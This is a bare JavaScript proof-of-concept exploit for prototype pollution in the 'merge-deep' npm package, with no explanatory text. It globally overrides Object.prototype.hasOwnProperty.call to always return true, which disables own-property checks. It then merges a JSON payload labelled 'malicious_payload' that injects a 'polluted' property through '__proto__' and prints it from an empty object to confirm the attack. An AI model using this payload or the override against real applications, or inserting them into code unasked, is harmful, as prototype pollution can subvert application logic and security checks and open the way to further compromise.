Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const merge = require('merge-deep');
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);